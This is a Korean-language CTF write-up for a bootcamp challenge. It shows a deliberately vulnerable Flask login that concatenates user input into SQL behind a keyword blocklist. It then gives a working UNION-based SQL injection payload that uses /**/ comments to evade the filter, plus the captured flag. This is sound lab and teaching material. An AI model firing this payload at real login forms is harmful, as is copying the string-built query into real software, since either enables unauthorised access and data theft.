---
title: "[Writeup] Knockon Bootcamp - 3.4 SQLi_WAF_4"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - SQL Injection
  - Filter Bypass
last_modified_at: 2024-08-29T15:30:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10033/>

![3.4 SQLi WAF 4 1](/assets/images/writeup/web-hacking/knock-on/3-4_SQLi_WAF_4_1.png)

![3.4 SQLi WAF 4 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)

![3.4 SQLi WAF 4 3](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_3.png)

|

|

|

### 목표

---

필터링 로직을 우회하여 admin 계정으로 로그인하기

|

### 공격 기법

---

SQL Injection

- Filter Bypass

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
import os
import string

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
LOGIN_FLAG = os.getenv("LOGIN_FLAG")
MYSQL_HOST = "db"

app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    query = None
    if request.method == "POST":
        filtering_list = ['or', 'and', '"', ' ', '=', '<', '>', '\\']
        username = request.form["username"].lower()
        password = request.form["password"].lower()

        for filter in filtering_list :
            if (filter in username) or (filter in password):
                return render_template("login.html", error='no Hack!')

        query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
        
        with db.engine.connect() as connection:
            result = connection.execute(query)
            user = result.fetchone()
        if user and user[1] == "admin":
            return redirect(url_for("success", username=user[1], flag=LOGIN_FLAG))
        elif user:
            return redirect(url_for("success", username=user[1]))
        else:
            error = "Invalid Credentials"
        return render_template("login.html", error=error, query=str(query))
    else :
        return render_template("login.html")

@app.route("/success")
def success():
    username = request.args.get("username", "Unknown")
    flag = request.args.get("flag", "So.. what?")
    return render_template("success.html", username=username, flag=flag)

if __name__ == "__main__":
    db.create_all()
    app.run(debug=True, host="0.0.0.0", port=8080)
```

|

|

|

## 코드 분석

### login()

---

```python
filtering_list = ['or', 'and', '"', ' ', '=', '<', '>', '\\']
```

등호, 부등호, 백슬래시가 추가되었고, 작은따옴표는 다시 사용 가능해짐

|

|

|

## Exploit

```sql
' union select 1,(select username from user limit 1,1),3 #
```

백 슬래시는 사용 불가능하고, 작은 따옴표는 사용 가능하기 때문에 username 부분에서 쿼리를 실행할 수 있게됨

|

```sql
'/**/union/**/select/**/1,(select/**/username/**/from/**/user/**/limit/**/1,1),3/**/#
```

공백은 사용 불가능하기 때문에 주석으로 대체

|

|

|

## Payload

```python
username: '/**/union/**/select/**/1,(select/**/username/**/from/**/user/**/limit/**/1,1),3/**/#

password: 1
```

|

|

### FLAG

---

```python
K0{WAF_is_no_use!}
```

|

---